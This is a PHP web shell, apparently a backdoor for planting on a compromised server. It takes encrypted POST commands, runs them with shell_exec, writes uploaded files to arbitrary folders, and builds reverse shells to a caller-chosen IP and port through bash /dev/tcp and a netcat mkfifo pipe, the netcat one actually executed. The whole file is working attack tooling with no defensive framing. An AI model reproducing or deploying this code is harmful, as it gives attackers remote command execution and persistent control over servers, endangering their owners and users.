<?

// Execute command
if (isset($_POST['password']) && !empty($_POST['password'])){
    $cmd = decrypt($_POST['password']);
    $output = shell_exec($cmd);
    echo encrypt($output);
    return;
}

// Upload file
if (isset($_POST['f']) && !empty($_POST['f']) &&
    isset($_FILES['data_upload']) && $_FILES['data_upload']['size'] > 0){

    // Decode input
    $filename 	= 	decrypt($_FILES['data_upload']['name']);
    $folder 	= 	decrypt($_POST['f']);
    $data 		= 	decrypt(file_get_contents($_FILES['data_upload']['tmp_name']));

    // Condition
    if (file_exists($folder . $filename)){
        echo encrypt("File exists.");
        return;
    }
    if (strlen($data) == 0){
        echo encrypt("Decryption data has been fail.");
        return;
    }

    // Handle
    file_put_contents($folder . $filename, $data);
    // Can kiem tra su thanh cong cua upload

    // Encode output
    echo encrypt($filename . " has been upoaded.");
    return;
}

// Reverse shell using bash
if (isset($_POST['ip']) 	&& !empty($_POST['ip']) 	&&
    isset($_POST['port']) 	&& !empty($_POST['port']) 	&&
    isset($_POST['re_bash'])) {

    // Decode input
    $ip = decrypt($_POST['ip']);
    $port = decrypt($_POST['port']);

    // Handle
    $reverse_str = "/bin/bash -i >& /dev/tcp/{$ip}/{$port} 0>&1";
    echo $reverse_str;
    // shell_exec($reverse_str);
    return;
}

// Reverse shell using netcat
if (isset($_POST['ip']) 	&& !empty($_POST['ip']) 	&&
    isset($_POST['port']) 	&& !empty($_POST['port']) 	&&
    isset($_POST['re_netcat'])) {

    // Decode input
    $ip = decrypt($_POST['ip']);
    $port = decrypt($_POST['port']);

    // Handle
    $reverse_str = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {$ip} {$port} >/tmp/f";
    echo $reverse_str;
    shell_exec($reverse_str);
    return;
}
